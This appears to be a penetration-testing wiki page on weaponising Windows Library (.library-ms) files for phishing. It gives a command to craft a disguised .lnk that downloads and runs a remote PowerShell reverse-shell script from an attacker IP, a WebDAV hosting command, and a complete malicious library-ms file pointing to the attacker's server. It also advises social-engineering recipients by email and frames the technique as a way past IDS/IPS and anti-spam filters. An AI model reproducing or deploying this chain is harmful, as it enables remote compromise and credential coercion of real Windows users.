# Windows Library Files

## Theory

Windows Library files (.library-ms files) are a virtual container for user content. It can be used to point to a remote or local storage location.&#x20;

We may send this file by e-mail and use social engineering to get the recipient to open the container (it will appear as a normal directory in Windows Explorer) and then to double-click on our hosted payload to execute it.

{% hint style="success" %}
By delivering our payload via a Windows Library File rather than directly sending a link directly to a remote server hosting our payload, we may avoid IDS/IPS/Anti-spam solutions.
{% endhint %}

{% hint style="info" %}
When SearchConnectorDescription section of the library-ms file points to a remote location, it will [force authentication](../../../ad/movement/mitm-and-coerced-authentications/) through explorer when opening the container folder.
{% endhint %}

## Practice

{% tabs %}
{% tab title="library-ms + lnk" %}
In this scenario, we'll create a `.library-ms` file pointing to our WebDAV server that is hosting a malicious `.lnk` file. The user will need to open both container and shortcut files to execute our payload.

First, let's create our malicious `.lnk` shortcut using [lnk.py](https://github.com/blacklanternsecurity/mklnk) (Python).&#x20;

```bash
# -a : Arguments
# -i : Icon location
python2.7 lnk.py evil.lnk 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -a '-c "iex(iwr http://192.168.45.225/rev.ps1 -UseBasicParsing)"' -i 'C:\Windows\System32\Notepad.exe'
```

Then, start a WebDAV server to host our payload

```bash
# Install with: sudo apt install python3-wsgidav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root .
```

We can now create our `evil.library-ms` file with the following content

<pre class="language-xml" data-title="evil.library-ms"><code class="lang-xml">&#x3C;?xml version="1.0" encoding="UTF-8"?>
&#x3C;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
&#x3C;name>@windows.storage.dll,-34582&#x3C;/name>
&#x3C;version>6&#x3C;/version>
&#x3C;isLibraryPinned>true&#x3C;/isLibraryPinned>
&#x3C;iconReference>imageres.dll,-1003&#x3C;/iconReference>
&#x3C;templateInfo>
&#x3C;folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}&#x3C;/folderType>
&#x3C;/templateInfo>
&#x3C;searchConnectorDescriptionList>
&#x3C;searchConnectorDescription>
&#x3C;isDefaultSaveLocation>true&#x3C;/isDefaultSaveLocation>
&#x3C;isSupported>false&#x3C;/isSupported>
&#x3C;simpleLocation>
<strong>&#x3C;url>http://ATTACKING_IP&#x3C;/url>
</strong>&#x3C;/simpleLocation>
&#x3C;/searchConnectorDescription>
&#x3C;/searchConnectorDescriptionList>
&#x3C;/libraryDescription>
</code></pre>

If you created this file on linux, we may need to change the text encoding as follow

```bash
unix2dos evil.library-ms
```

We can now send the evil.library-ms file to the target !
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://filesec.io/library-ms" %}
